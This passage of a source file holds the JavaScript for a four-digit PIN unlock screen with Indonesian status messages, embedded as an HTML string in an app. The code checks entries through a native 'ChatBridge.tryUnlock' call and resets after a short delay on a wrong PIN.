  if (event.sourceCapabilities && event.sourceCapabilities.firesTouchEvents) return
  var key = event.target.closest('.key')
  if (!key || key.classList.contains('empty')) return
  if (key.dataset.del) { doDelete(); return }
  if (key.dataset.n !== undefined) doPress(key.dataset.n)
})

function doPress(number) {
  if (blocked || pin.length >= 4) return
  pin += number
  updateDots()
  if (pin.length === 4) setTimeout(checkPin, 150)
}

function doDelete() {
  if (blocked) return
  pin = pin.slice(0, -1)
  updateDots()
  setStatus('', false, false)
}

function updateDots() {
  for (var index = 0; index < 4; index++) {
    var dot = document.getElementById('d' + index)
    dot.classList.toggle('filled', index < pin.length)
    dot.classList.remove('error')
  }
}

function checkPin() {
  var isCorrect = false
  try {
    isCorrect = ChatBridge.tryUnlock(pin)
  } catch (error) {}

  if (isCorrect) {
    setStatus('PIN Benar ✓', false, true)
    return
  }

  setStatus('PIN Salah!', true, false)

  for (var index = 0; index < 4; index++) {
    document.getElementById('d' + index).classList.add('error')
  }

  blocked = true

  setTimeout(function() {
    pin = ''
    blocked = false
    updateDots()
    setStatus('Coba lagi', false, false)
  }, 1200)
}

function setStatus(message, isError, isSuccess) {
  var element = document.getElementById('pinStatus')
  element.textContent = message || 'Ketuk angka di bawah'
  element.className =
    'pin-status' +
    (isError ? ' err' : isSuccess ? ' ok' : '')
}
</script>

</body>
</html>

"""
    }
}
